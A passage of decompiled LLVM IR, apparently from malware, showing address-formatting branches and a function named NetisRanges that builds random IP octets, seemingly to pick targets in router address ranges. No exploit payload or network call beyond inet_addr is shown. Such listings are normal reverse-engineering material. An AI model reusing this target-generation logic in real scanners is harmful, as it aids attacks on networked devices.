  %v3_10006c00 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006c00 = zext i8 %v3_10006c00 to i32
  %v4_10006c30 = call i32 @szprintf(i32 %v2_10006bec, i32 ptrtoint ([14 x i8]* @global_var_10016fb8.222 to i32), i32 %v4_10006c00)
  br label %dec_label_pc_10006c34

dec_label_pc_10006c34:                            ; preds = %dec_label_pc_10006be0, %dec_label_pc_10006bec
  %v3_10006c38 = icmp eq i32 %v2_10002f1c, 187
  br i1 %v3_10006c38, label %dec_label_pc_10006c40, label %dec_label_pc_10006c88

dec_label_pc_10006c40:                            ; preds = %dec_label_pc_10006c34
  %v2_10006c40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c54 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006c54 = zext i8 %v3_10006c54 to i32
  %v4_10006c84 = call i32 @szprintf(i32 %v2_10006c40, i32 ptrtoint ([14 x i8]* @global_var_10016fc8.223 to i32), i32 %v4_10006c54)
  br label %dec_label_pc_10006c88

dec_label_pc_10006c88:                            ; preds = %dec_label_pc_10006c34, %dec_label_pc_10006c40
  %v3_10006c8c = icmp eq i32 %v2_10002f1c, 188
  br i1 %v3_10006c8c, label %dec_label_pc_10006c94, label %dec_label_pc_10006cdc

dec_label_pc_10006c94:                            ; preds = %dec_label_pc_10006c88
  %v2_10006c94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ca8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006ca8 = zext i8 %v3_10006ca8 to i32
  %v4_10006cd8 = call i32 @szprintf(i32 %v2_10006c94, i32 ptrtoint ([14 x i8]* @global_var_10016fd8.224 to i32), i32 %v4_10006ca8)
  br label %dec_label_pc_10006cdc

dec_label_pc_10006cdc:                            ; preds = %dec_label_pc_10006c88, %dec_label_pc_10006c94
  %v3_10006ce0 = icmp eq i32 %v2_10002f1c, 189
  br i1 %v3_10006ce0, label %dec_label_pc_10006ce8, label %dec_label_pc_10006d30

dec_label_pc_10006ce8:                            ; preds = %dec_label_pc_10006cdc
  %v2_10006ce8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006cfc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006cfc = zext i8 %v3_10006cfc to i32
  %v4_10006d2c = call i32 @szprintf(i32 %v2_10006ce8, i32 ptrtoint ([14 x i8]* @global_var_10016fe8.225 to i32), i32 %v4_10006cfc)
  br label %dec_label_pc_10006d30

dec_label_pc_10006d30:                            ; preds = %dec_label_pc_10006cdc, %dec_label_pc_10006ce8
  %v3_10006d34 = icmp eq i32 %v2_10002f1c, 190
  br i1 %v3_10006d34, label %dec_label_pc_10006d3c, label %dec_label_pc_10006d84

dec_label_pc_10006d3c:                            ; preds = %dec_label_pc_10006d30
  %v2_10006d3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d50 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006d50 = zext i8 %v3_10006d50 to i32
  %v4_10006d80 = call i32 @szprintf(i32 %v2_10006d3c, i32 ptrtoint ([14 x i8]* @global_var_10016ff8.226 to i32), i32 %v4_10006d50)
  br label %dec_label_pc_10006d84

dec_label_pc_10006d84:                            ; preds = %dec_label_pc_10006d30, %dec_label_pc_10006d3c
  %v3_10006d88 = icmp eq i32 %v2_10002f1c, 191
  br i1 %v3_10006d88, label %dec_label_pc_10006d90, label %dec_label_pc_10006dd8

dec_label_pc_10006d90:                            ; preds = %dec_label_pc_10006d84
  %v2_10006d90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006da4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006da4 = zext i8 %v3_10006da4 to i32
  %v4_10006dd4 = call i32 @szprintf(i32 %v2_10006d90, i32 ptrtoint ([14 x i8]* @global_var_10017008.227 to i32), i32 %v4_10006da4)
  br label %dec_label_pc_10006dd8

dec_label_pc_10006dd8:                            ; preds = %dec_label_pc_10006d84, %dec_label_pc_10006d90
  %v3_10006ddc = icmp eq i32 %v2_10002f1c, 192
  br i1 %v3_10006ddc, label %dec_label_pc_10006de4, label %dec_label_pc_10006e2c

dec_label_pc_10006de4:                            ; preds = %dec_label_pc_10006dd8
  %v2_10006de4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006df8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006df8 = zext i8 %v3_10006df8 to i32
  %v4_10006e28 = call i32 @szprintf(i32 %v2_10006de4, i32 ptrtoint ([13 x i8]* @global_var_10017018.228 to i32), i32 %v4_10006df8)
  br label %dec_label_pc_10006e2c

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006dd8, %dec_label_pc_10006de4
  %v3_10006e30 = icmp eq i32 %v2_10002f1c, 193
  br i1 %v3_10006e30, label %dec_label_pc_10006e38, label %dec_label_pc_10006e80

dec_label_pc_10006e38:                            ; preds = %dec_label_pc_10006e2c
  %v2_10006e38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e4c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006e4c = zext i8 %v3_10006e4c to i32
  %v4_10006e7c = call i32 @szprintf(i32 %v2_10006e38, i32 ptrtoint ([13 x i8]* @global_var_10017028.229 to i32), i32 %v4_10006e4c)
  br label %dec_label_pc_10006e80

dec_label_pc_10006e80:                            ; preds = %dec_label_pc_10006e2c, %dec_label_pc_10006e38
  %v3_10006e84 = icmp eq i32 %v2_10002f1c, 194
  br i1 %v3_10006e84, label %dec_label_pc_10006e8c, label %dec_label_pc_10006ed4

dec_label_pc_10006e8c:                            ; preds = %dec_label_pc_10006e80
  %v2_10006e8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ea0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006ea0 = zext i8 %v3_10006ea0 to i32
  %v4_10006ed0 = call i32 @szprintf(i32 %v2_10006e8c, i32 ptrtoint ([14 x i8]* @global_var_10017038.230 to i32), i32 %v4_10006ea0)
  br label %dec_label_pc_10006ed4

dec_label_pc_10006ed4:                            ; preds = %dec_label_pc_10006e80, %dec_label_pc_10006e8c
  %v3_10006ed8 = icmp eq i32 %v2_10002f1c, 195
  br i1 %v3_10006ed8, label %dec_label_pc_10006ee0, label %dec_label_pc_10006f28

dec_label_pc_10006ee0:                            ; preds = %dec_label_pc_10006ed4
  %v2_10006ee0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ef4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006ef4 = zext i8 %v3_10006ef4 to i32
  %v4_10006f24 = call i32 @szprintf(i32 %v2_10006ee0, i32 ptrtoint ([14 x i8]* @global_var_10017048.231 to i32), i32 %v4_10006ef4)
  br label %dec_label_pc_10006f28

dec_label_pc_10006f28:                            ; preds = %dec_label_pc_10006ed4, %dec_label_pc_10006ee0
  %v3_10006f2c = icmp eq i32 %v2_10002f1c, 196
  br i1 %v3_10006f2c, label %dec_label_pc_10006f34, label %dec_label_pc_10006f7c

dec_label_pc_10006f34:                            ; preds = %dec_label_pc_10006f28
  %v2_10006f34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f48 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006f48 = zext i8 %v3_10006f48 to i32
  %v4_10006f78 = call i32 @szprintf(i32 %v2_10006f34, i32 ptrtoint ([14 x i8]* @global_var_10017058.232 to i32), i32 %v4_10006f48)
  br label %dec_label_pc_10006f7c

dec_label_pc_10006f7c:                            ; preds = %dec_label_pc_10006f28, %dec_label_pc_10006f34
  %v3_10006f80 = icmp eq i32 %v2_10002f1c, 197
  br i1 %v3_10006f80, label %dec_label_pc_10006f88, label %dec_label_pc_10006fd0

dec_label_pc_10006f88:                            ; preds = %dec_label_pc_10006f7c
  %v2_10006f88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f9c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006f9c = zext i8 %v3_10006f9c to i32
  %v4_10006fcc = call i32 @szprintf(i32 %v2_10006f88, i32 ptrtoint ([14 x i8]* @global_var_10017068.233 to i32), i32 %v4_10006f9c)
  br label %dec_label_pc_10006fd0

dec_label_pc_10006fd0:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_10006f88
  %v3_10006fd4 = icmp eq i32 %v2_10002f1c, 198
  br i1 %v3_10006fd4, label %dec_label_pc_10006fdc, label %dec_label_pc_10007024

dec_label_pc_10006fdc:                            ; preds = %dec_label_pc_10006fd0
  %v2_10006fdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ff0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006ff0 = zext i8 %v3_10006ff0 to i32
  %v4_10007020 = call i32 @szprintf(i32 %v2_10006fdc, i32 ptrtoint ([14 x i8]* @global_var_10017078.234 to i32), i32 %v4_10006ff0)
  br label %dec_label_pc_10007024

dec_label_pc_10007024:                            ; preds = %dec_label_pc_10006fd0, %dec_label_pc_10006fdc
  %v3_10007028 = icmp eq i32 %v2_10002f1c, 199
  br i1 %v3_10007028, label %dec_label_pc_10007030, label %dec_label_pc_10007078

dec_label_pc_10007030:                            ; preds = %dec_label_pc_10007024
  %v2_10007030 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007044 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007044 = zext i8 %v3_10007044 to i32
  %v4_10007074 = call i32 @szprintf(i32 %v2_10007030, i32 ptrtoint ([14 x i8]* @global_var_10017088.235 to i32), i32 %v4_10007044)
  br label %dec_label_pc_10007078

dec_label_pc_10007078:                            ; preds = %dec_label_pc_10007024, %dec_label_pc_10007030
  %v3_1000707c = icmp eq i32 %v2_10002f1c, 200
  br i1 %v3_1000707c, label %dec_label_pc_10007084, label %dec_label_pc_100070cc

dec_label_pc_10007084:                            ; preds = %dec_label_pc_10007078
  %v2_10007084 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007098 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007098 = zext i8 %v3_10007098 to i32
  %v4_100070c8 = call i32 @szprintf(i32 %v2_10007084, i32 ptrtoint ([14 x i8]* @global_var_10017098.236 to i32), i32 %v4_10007098)
  br label %dec_label_pc_100070cc

dec_label_pc_100070cc:                            ; preds = %dec_label_pc_10007078, %dec_label_pc_10007084
  %v3_100070d0 = icmp eq i32 %v2_10002f1c, 201
  br i1 %v3_100070d0, label %dec_label_pc_1000712c, label %dec_label_pc_10007120

dec_label_pc_10007120:                            ; preds = %dec_label_pc_100070cc
  br label %dec_label_pc_10007174

dec_label_pc_1000712c:                            ; preds = %dec_label_pc_100070cc
  %v2_100070d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100070ec = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100070ec = zext i8 %v3_100070ec to i32
  %v4_1000711c = call i32 @szprintf(i32 %v2_100070d8, i32 ptrtoint ([14 x i8]* @global_var_100170a8.237 to i32), i32 %v4_100070ec)
  %v3_10007140 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007140 = zext i8 %v3_10007140 to i32
  %v4_10007170 = call i32 @szprintf(i32 %v2_100070d8, i32 ptrtoint ([13 x i8]* @global_var_100170b8.238 to i32), i32 %v4_10007140)
  br label %dec_label_pc_10007174

dec_label_pc_10007174:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_1000712c
  %v3_10007178 = icmp eq i32 %v2_10002f1c, 202
  br i1 %v3_10007178, label %dec_label_pc_10007180, label %dec_label_pc_100071c8

dec_label_pc_10007180:                            ; preds = %dec_label_pc_10007174
  %v2_10007180 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007194 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007194 = zext i8 %v3_10007194 to i32
  %v4_100071c4 = call i32 @szprintf(i32 %v2_10007180, i32 ptrtoint ([13 x i8]* @global_var_100170c8.239 to i32), i32 %v4_10007194)
  br label %dec_label_pc_100071c8

dec_label_pc_100071c8:                            ; preds = %dec_label_pc_10007174, %dec_label_pc_10007180
  %v3_100071cc = icmp eq i32 %v2_10002f1c, 203
  br i1 %v3_100071cc, label %dec_label_pc_100071d4, label %dec_label_pc_1000721c

dec_label_pc_100071d4:                            ; preds = %dec_label_pc_100071c8
  %v2_100071d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100071e8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100071e8 = zext i8 %v3_100071e8 to i32
  %v4_10007218 = call i32 @szprintf(i32 %v2_100071d4, i32 ptrtoint ([13 x i8]* @global_var_100170d8.240 to i32), i32 %v4_100071e8)
  br label %dec_label_pc_1000721c

dec_label_pc_1000721c:                            ; preds = %dec_label_pc_100071c8, %dec_label_pc_100071d4
  %v3_10007220 = icmp eq i32 %v2_10002f1c, 204
  br i1 %v3_10007220, label %dec_label_pc_10007228, label %dec_label_pc_10007270

dec_label_pc_10007228:                            ; preds = %dec_label_pc_1000721c
  %v2_10007228 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000723c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000723c = zext i8 %v3_1000723c to i32
  %v4_1000726c = call i32 @szprintf(i32 %v2_10007228, i32 ptrtoint ([13 x i8]* @global_var_100170e8.241 to i32), i32 %v4_1000723c)
  br label %dec_label_pc_10007270

dec_label_pc_10007270:                            ; preds = %dec_label_pc_1000721c, %dec_label_pc_10007228
  %v3_10007274 = icmp eq i32 %v2_10002f1c, 205
  br i1 %v3_10007274, label %dec_label_pc_1000727c, label %dec_label_pc_100072c4

dec_label_pc_1000727c:                            ; preds = %dec_label_pc_10007270
  %v2_1000727c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007290 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007290 = zext i8 %v3_10007290 to i32
  %v4_100072c0 = call i32 @szprintf(i32 %v2_1000727c, i32 ptrtoint ([13 x i8]* @global_var_100170f8.242 to i32), i32 %v4_10007290)
  br label %dec_label_pc_100072c4

dec_label_pc_100072c4:                            ; preds = %dec_label_pc_10007270, %dec_label_pc_1000727c
  %v3_100072c8 = icmp eq i32 %v2_10002f1c, 206
  br i1 %v3_100072c8, label %dec_label_pc_100072d0, label %dec_label_pc_10007318

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_100072c4
  %v2_100072d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100072e4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100072e4 = zext i8 %v3_100072e4 to i32
  %v4_10007314 = call i32 @szprintf(i32 %v2_100072d0, i32 ptrtoint ([13 x i8]* @global_var_10017108.243 to i32), i32 %v4_100072e4)
  br label %dec_label_pc_10007318

dec_label_pc_10007318:                            ; preds = %dec_label_pc_100072c4, %dec_label_pc_100072d0
  %v3_1000731c = icmp eq i32 %v2_10002f1c, 207
  %v2_10007324 = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_1000731c, label %dec_label_pc_10007324, label %dec_label_pc_1000736c

dec_label_pc_10007324:                            ; preds = %dec_label_pc_10007318
  %v3_10007338 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10007338 = zext i8 %v3_10007338 to i32
  %v4_10007368 = call i32 @szprintf(i32 %v2_10007324, i32 ptrtoint ([14 x i8]* @global_var_10017118.244 to i32), i32 %v4_10007338)
  br label %dec_label_pc_1000736c

dec_label_pc_1000736c:                            ; preds = %dec_label_pc_10007318, %dec_label_pc_10007324
  br i1 false, label %dec_label_pc_10007378, label %dec_label_pc_100073c0

dec_label_pc_10007378:                            ; preds = %dec_label_pc_1000736c
  br label %dec_label_pc_100073c0

dec_label_pc_100073c0:                            ; preds = %dec_label_pc_1000736c, %dec_label_pc_10007378
  store i32 268465100, i32* @lr, align 4
  %v1_100073c8 = call i32 @inet_addr(i32 %v2_10007324)
  ret i32 %v1_100073c8

; uselistorder directives
  uselistorder label %dec_label_pc_100073c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000736c, { 1, 0 }
  uselistorder label %dec_label_pc_10007318, { 1, 0 }
  uselistorder label %dec_label_pc_100072c4, { 1, 0 }
  uselistorder label %dec_label_pc_10007270, { 1, 0 }
  uselistorder label %dec_label_pc_1000721c, { 1, 0 }
  uselistorder label %dec_label_pc_100071c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007174, { 1, 0 }
  uselistorder label %dec_label_pc_100070cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007078, { 1, 0 }
  uselistorder label %dec_label_pc_10007024, { 1, 0 }
  uselistorder label %dec_label_pc_10006fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10006f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f28, { 1, 0 }
  uselistorder label %dec_label_pc_10006ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10006e80, { 1, 0 }
  uselistorder label %dec_label_pc_10006e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10006d84, { 1, 0 }
  uselistorder label %dec_label_pc_10006d30, { 1, 0 }
  uselistorder label %dec_label_pc_10006cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10006c88, { 1, 0 }
  uselistorder label %dec_label_pc_10006c34, { 1, 0 }
  uselistorder label %dec_label_pc_10006be0, { 1, 0 }
  uselistorder label %dec_label_pc_10006b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10006b38, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10006a90, { 1, 0 }
  uselistorder label %dec_label_pc_10006a3c, { 1, 0 }
  uselistorder label %dec_label_pc_100069e8, { 1, 0 }
  uselistorder label %dec_label_pc_10006994, { 1, 0 }
  uselistorder label %dec_label_pc_10006940, { 1, 0 }
  uselistorder label %dec_label_pc_100068ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006898, { 1, 0 }
  uselistorder label %dec_label_pc_10006844, { 1, 0 }
  uselistorder label %dec_label_pc_100067f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000679c, { 1, 0 }
  uselistorder label %dec_label_pc_10006748, { 1, 0 }
  uselistorder label %dec_label_pc_100066f4, { 1, 0 }
  uselistorder label %dec_label_pc_100066a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000664c, { 1, 0 }
  uselistorder label %dec_label_pc_100065f8, { 1, 0 }
  uselistorder label %dec_label_pc_100065a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006550, { 1, 0 }
  uselistorder label %dec_label_pc_100064fc, { 1, 0 }
  uselistorder label %dec_label_pc_100064a8, { 1, 0 }
  uselistorder label %dec_label_pc_10006454, { 1, 0 }
  uselistorder label %dec_label_pc_10006400, { 1, 0 }
  uselistorder label %dec_label_pc_100063ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006358, { 1, 0 }
  uselistorder label %dec_label_pc_10006304, { 1, 0 }
  uselistorder label %dec_label_pc_100062b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000625c, { 1, 0 }
  uselistorder label %dec_label_pc_10006208, { 1, 0 }
  uselistorder label %dec_label_pc_100061b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006160, { 1, 0 }
  uselistorder label %dec_label_pc_1000610c, { 1, 0 }
  uselistorder label %dec_label_pc_100060b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006064, { 1, 0 }
  uselistorder label %dec_label_pc_10006010, { 1, 0 }
  uselistorder label %dec_label_pc_10005fbc, { 1, 0 }
  uselistorder label %dec_label_pc_10005f68, { 1, 0 }
  uselistorder label %dec_label_pc_10005f14, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10005e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e18, { 1, 0 }
  uselistorder label %dec_label_pc_10005dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10005d70, { 1, 0 }
  uselistorder label %dec_label_pc_10005d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10005c74, { 1, 0 }
  uselistorder label %dec_label_pc_10005c20, { 1, 0 }
  uselistorder label %dec_label_pc_10005bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10005b78, { 1, 0 }
  uselistorder label %dec_label_pc_10005b24, { 1, 0 }
  uselistorder label %dec_label_pc_10005ad0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005a28, { 1, 0 }
  uselistorder label %dec_label_pc_100059d4, { 1, 0 }
  uselistorder label %dec_label_pc_10005980, { 1, 0 }
  uselistorder label %dec_label_pc_1000592c, { 1, 0 }
  uselistorder label %dec_label_pc_100058d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005884, { 1, 0 }
  uselistorder label %dec_label_pc_10005830, { 1, 0 }
  uselistorder label %dec_label_pc_100057dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005788, { 1, 0 }
  uselistorder label %dec_label_pc_10005734, { 1, 0 }
  uselistorder label %dec_label_pc_100056e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000568c, { 1, 0 }
  uselistorder label %dec_label_pc_10005638, { 1, 0 }
  uselistorder label %dec_label_pc_100055e4, { 1, 0 }
  uselistorder label %dec_label_pc_10005590, { 1, 0 }
  uselistorder label %dec_label_pc_1000553c, { 1, 0 }
  uselistorder label %dec_label_pc_100054e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005494, { 1, 0 }
  uselistorder label %dec_label_pc_10005440, { 1, 0 }
  uselistorder label %dec_label_pc_100053ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005398, { 1, 0 }
  uselistorder label %dec_label_pc_10005344, { 1, 0 }
  uselistorder label %dec_label_pc_100052f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000529c, { 1, 0 }
  uselistorder label %dec_label_pc_10005248, { 1, 0 }
  uselistorder label %dec_label_pc_100051f4, { 1, 0 }
  uselistorder label %dec_label_pc_100051a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000514c, { 1, 0 }
  uselistorder label %dec_label_pc_100050f8, { 1, 0 }
  uselistorder label %dec_label_pc_100050a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005050, { 1, 0 }
  uselistorder label %dec_label_pc_10004ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10004fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10004f54, { 1, 0 }
  uselistorder label %dec_label_pc_10004f00, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac, { 1, 0 }
  uselistorder label %dec_label_pc_10004e58, { 1, 0 }
  uselistorder label %dec_label_pc_10004e04, { 1, 0 }
  uselistorder label %dec_label_pc_10004db0, { 1, 0 }
  uselistorder label %dec_label_pc_10004d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10004d08, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb4, { 1, 0 }
  uselistorder label %dec_label_pc_10004c60, { 1, 0 }
  uselistorder label %dec_label_pc_10004c0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004b64, { 1, 0 }
  uselistorder label %dec_label_pc_10004b10, { 1, 0 }
  uselistorder label %dec_label_pc_10004abc, { 1, 0 }
  uselistorder label %dec_label_pc_10004a68, { 1, 0 }
  uselistorder label %dec_label_pc_10004a14, { 1, 0 }
  uselistorder label %dec_label_pc_100049c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000496c, { 1, 0 }
  uselistorder label %dec_label_pc_10004918, { 1, 0 }
  uselistorder label %dec_label_pc_100048c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004870, { 1, 0 }
  uselistorder label %dec_label_pc_1000481c, { 1, 0 }
  uselistorder label %dec_label_pc_100047c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004774, { 1, 0 }
  uselistorder label %dec_label_pc_10004720, { 1, 0 }
  uselistorder label %dec_label_pc_100046cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004678, { 1, 0 }
  uselistorder label %dec_label_pc_10004624, { 1, 0 }
  uselistorder label %dec_label_pc_100045d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000457c, { 1, 0 }
  uselistorder label %dec_label_pc_10004528, { 1, 0 }
  uselistorder label %dec_label_pc_100044d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004480, { 1, 0 }
  uselistorder label %dec_label_pc_1000442c, { 1, 0 }
  uselistorder label %dec_label_pc_100043d8, { 1, 0 }
  uselistorder label %dec_label_pc_10004384, { 1, 0 }
  uselistorder label %dec_label_pc_10004330, { 1, 0 }
  uselistorder label %dec_label_pc_100042dc, { 1, 0 }
  uselistorder label %dec_label_pc_10004288, { 1, 0 }
  uselistorder label %dec_label_pc_10004234, { 1, 0 }
  uselistorder label %dec_label_pc_100041e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000418c, { 1, 0 }
  uselistorder label %dec_label_pc_10004138, { 1, 0 }
  uselistorder label %dec_label_pc_100040e4, { 1, 0 }
  uselistorder label %dec_label_pc_10004090, { 1, 0 }
  uselistorder label %dec_label_pc_1000403c, { 1, 0 }
  uselistorder label %dec_label_pc_10003fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10003f94, { 1, 0 }
  uselistorder label %dec_label_pc_10003f40, { 1, 0 }
  uselistorder label %dec_label_pc_10003eec, { 1, 0 }
  uselistorder label %dec_label_pc_10003e98, { 1, 0 }
  uselistorder label %dec_label_pc_10003e44, { 1, 0 }
  uselistorder label %dec_label_pc_10003df0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d9c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d48, { 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10003ca0, { 1, 0 }
  uselistorder label %dec_label_pc_10003c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b50, { 1, 0 }
  uselistorder label %dec_label_pc_10003afc, { 1, 0 }
  uselistorder label %dec_label_pc_10003aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10003a54, { 1, 0 }
  uselistorder label %dec_label_pc_10003a00, { 1, 0 }
  uselistorder label %dec_label_pc_100039ac, { 1, 0 }
  uselistorder label %dec_label_pc_10003958, { 1, 0 }
  uselistorder label %dec_label_pc_10003904, { 1, 0 }
  uselistorder label %dec_label_pc_100038b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000385c, { 1, 0 }
  uselistorder label %dec_label_pc_10003808, { 1, 0 }
  uselistorder label %dec_label_pc_100037b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003760, { 1, 0 }
  uselistorder label %dec_label_pc_1000370c, { 1, 0 }
  uselistorder label %dec_label_pc_100036b8, { 1, 0 }
  uselistorder label %dec_label_pc_10003664, { 1, 0 }
  uselistorder label %dec_label_pc_10003610, { 1, 0 }
  uselistorder label %dec_label_pc_100035bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003568, { 1, 0 }
  uselistorder label %dec_label_pc_10003514, { 1, 0 }
  uselistorder label %dec_label_pc_100034c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000346c, { 1, 0 }
  uselistorder label %dec_label_pc_10003418, { 1, 0 }
  uselistorder label %dec_label_pc_100033c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003370, { 1, 0 }
  uselistorder label %dec_label_pc_1000331c, { 1, 0 }
  uselistorder label %dec_label_pc_100032c8, { 1, 0 }
  uselistorder label %dec_label_pc_10003274, { 1, 0 }
  uselistorder label %dec_label_pc_10003220, { 1, 0 }
  uselistorder label %dec_label_pc_100031cc, { 1, 0 }
  uselistorder label %dec_label_pc_10003178, { 1, 0 }
  uselistorder label %dec_label_pc_10003124, { 1, 0 }
  uselistorder label %dec_label_pc_100030d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000307c, { 1, 0 }
  uselistorder label %dec_label_pc_10003028, { 1, 0 }
  uselistorder label %dec_label_pc_10002fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10002f80, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i32 268465156, i32* @lr, align 4
  %v0_10007400 = call i32 @random()
  %v1_10007418 = urem i32 %v0_10007400, 30
  %v1_10007444 = mul nuw nsw i32 %v1_10007418, 4
  %v2_10007448 = add i32 %v1_10007444, ptrtoint (i32* @global_var_1002c4f0.246 to i32)
  %v1_1000744c = inttoptr i32 %v2_10007448 to i32*
  %v2_1000744c = load i32, i32* %v1_1000744c, align 4
  %v1_1000745c = trunc i32 %v2_1000744c to i8
  store i8 %v1_1000745c, i8* @global_var_1002c8f9.44, align 1
  store i32 268465252, i32* @lr, align 4
  %v0_10007460 = call i32 @random()
  %v2_10007480 = srem i32 %v0_10007460, 255
  %v1_100074a8 = trunc i32 %v2_10007480 to i8
  store i8 %v1_100074a8, i8* @global_var_1002c8fa.45, align 1
  store i32 268465328, i32* @lr, align 4
  %v0_100074ac = call i32 @random()
  %v2_100074cc = srem i32 %v0_100074ac, 255
  %v1_100074f4 = trunc i32 %v2_100074cc to i8
  store i8 %v1_100074f4, i8* @global_var_1002c8fb.46, align 1
  store i32 268465404, i32* @lr, align 4
  %v0_100074f8 = call i32 @random()
  %v2_10007508 = sext i32 %v0_100074f8 to i64
  %v4_10007508 = mul nsw i64 %v2_10007508, -2139062143
  %v5_10007508 = udiv i64 %v4_10007508, 4294967296
  %v6_10007508 = trunc i64 %v5_10007508 to i32
  %v2_1000750c = add i32 %v6_10007508, %v0_100074f8
